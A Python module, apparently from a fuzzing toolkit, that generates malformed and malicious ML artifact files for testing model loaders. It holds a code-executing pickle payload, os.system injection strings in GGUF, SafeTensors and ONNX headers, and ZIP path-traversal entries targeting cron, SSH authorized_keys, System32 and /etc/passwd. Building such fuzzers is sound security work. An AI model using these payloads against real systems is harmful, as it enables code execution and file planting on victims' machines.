"""Artifact format generator — GGUF, ONNX, SafeTensors, PyTorch, ZIP."""

from __future__ import annotations

import io
import json
import random
import struct
import zipfile
from typing import Optional

from ..base import Generator


class ArtifactGenerator(Generator):
    """Generates adversarial ML artifact files.

    Supports: GGUF header fuzzing, SafeTensors header corruption,
    PyTorch ZIP+pickle, ONNX protobuf, ZIP path traversal.
    """

    def __init__(self, format: str = "random", seed: Optional[int] = None):
        self._format = format
        self._seed = seed

    def generate(self, seed: Optional[int] = None) -> bytes:
        rng = random.Random(seed or self._seed)
        fmt = self._format
        if fmt == "random":
            fmt = rng.choice(["gguf", "safetensors", "pytorch", "zip", "onnx"])

        if fmt == "gguf":
            return self._gen_gguf(rng)
        elif fmt == "safetensors":
            return self._gen_safetensors(rng)
        elif fmt == "pytorch":
            return self._gen_pytorch_zip(rng)
        elif fmt == "zip":
            return self._gen_zip_slip(rng)
        elif fmt == "onnx":
            return self._gen_onnx_stub(rng)
        else:
            return self._gen_gguf(rng)

    def generate_from_bytes(self, data: bytes) -> bytes:
        seed = int.from_bytes(data[:8].ljust(8, b"\x00"), "little")
        return self.generate(seed=seed)

    def _gen_gguf(self, rng: random.Random) -> bytes:
        """Generate malformed GGUF file header."""
        buf = io.BytesIO()

        # GGUF magic bytes
        buf.write(b"GGUF")
        # Version (corrupt)
        version = rng.choice([1, 2, 3, 0, 255, 0xFFFFFFFF])
        buf.write(struct.pack("<I", version & 0xFFFFFFFF))
        # Tensor count (potentially huge)
        tensor_count = rng.choice([0, 1, 0xFFFFFFFF, 0x7FFFFFFF])
        buf.write(struct.pack("<Q", tensor_count))
        # KV count (potentially huge)
        kv_count = rng.choice([0, 1, 100, 0xFFFFFFFF])
        buf.write(struct.pack("<Q", kv_count))

        # Fake KV pairs with malicious content
        for _ in range(min(5, kv_count)):
            key = rng.choice([
                b"general.name",
                b"general.architecture",
                b"general.author",
                b"tokenizer.ggml.model",
                b"__import__('os').system('id')",
                b"../../../etc/passwd",
            ])
            buf.write(struct.pack("<Q", len(key)))
            buf.write(key)
            # Type: string (8)
            buf.write(struct.pack("<I", 8))
            val = rng.choice([
                b"llama",
                b"A" * 10000,
                b"\x00" * 100,
                b"{{__import__('os').system('id')}}",
            ])
            buf.write(struct.pack("<Q", len(val)))
            buf.write(val)

        # Pad with garbage
        buf.write(bytes(rng.randint(0, 255) for _ in range(rng.randint(100, 500))))
        return buf.getvalue()

    def _gen_safetensors(self, rng: random.Random) -> bytes:
        """Generate malformed SafeTensors header."""
        choice = rng.random()

        if choice < 0.3:
            # Oversized header length
            header_len = 0xFFFFFFFF
            header = b'{"test": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}}'
            return struct.pack("<Q", header_len) + header
        elif choice < 0.5:
            # Malicious JSON in header
            header = json.dumps({
                "__import__('os').system('id')": {
                    "dtype": "F32",
                    "shape": [1],
                    "data_offsets": [0, 4],
                },
                "__metadata__": {
                    "eval": "__import__('os').system('id')",
                    "path": "../../../etc/passwd",
                },
            }).encode()
            return struct.pack("<Q", len(header)) + header + b"\x00" * 4
        elif choice < 0.7:
            # Zero-length header
            return struct.pack("<Q", 0)
        else:
            # Negative offsets / huge shapes
            header = json.dumps({
                "weight": {
                    "dtype": "F32",
                    "shape": [0x7FFFFFFF, 0x7FFFFFFF],
                    "data_offsets": [-1, 0xFFFFFFFFFFFFFFFF],
                },
            }).encode()
            return struct.pack("<Q", len(header)) + header

    def _gen_pytorch_zip(self, rng: random.Random) -> bytes:
        """Generate malicious PyTorch ZIP with embedded pickle."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            # Standard PyTorch structure
            zf.writestr("archive/data.pkl", b"\x80\x02cos\nsystem\n(S'id'\ntR.")
            zf.writestr("archive/data/0", b"\x00" * 16)

            # Optional: path traversal
            if rng.random() < 0.5:
                zf.writestr("../../../tmp/pwned.txt", b"PWNED")

        return buf.getvalue()

    def _gen_zip_slip(self, rng: random.Random) -> bytes:
        """Generate ZIP with path traversal entries."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            traversal_paths = [
                "../../../etc/cron.d/backdoor",
                "../../../tmp/pwned",
                "..\\..\\..\\Windows\\System32\\evil.dll",
                "archive/../../../home/user/.ssh/authorized_keys",
                "data/../../../../../../etc/passwd",
            ]
            for path in traversal_paths:
                zf.writestr(path, b"MALICIOUS CONTENT")

            # Also add symlink-like entry
            zf.writestr("symlink.txt", b"/etc/shadow")

        return buf.getvalue()

    def _gen_onnx_stub(self, rng: random.Random) -> bytes:
        """Generate malformed ONNX protobuf stub."""
        buf = io.BytesIO()

        # Protobuf field: ir_version (field 1, varint)
        buf.write(b"\x08")
        buf.write(struct.pack("B", rng.choice([0, 1, 7, 8, 9, 255])))

        # producer_name (field 2, length-delimited)
        producer = rng.choice([
            b"onnx",
            b"__import__('os').system('id')",
            b"A" * 10000,
            b"\x00" * 500,
        ])
        buf.write(b"\x12")
        buf.write(struct.pack("B", min(127, len(producer))))
        buf.write(producer[:127])

        # model_version (field 5, varint) — huge value
        buf.write(b"\x28")
        buf.write(b"\xFF\xFF\xFF\xFF\x07")

        # Add garbage graph
        buf.write(bytes(rng.randint(0, 255) for _ in range(rng.randint(50, 200))))

        return buf.getvalue()
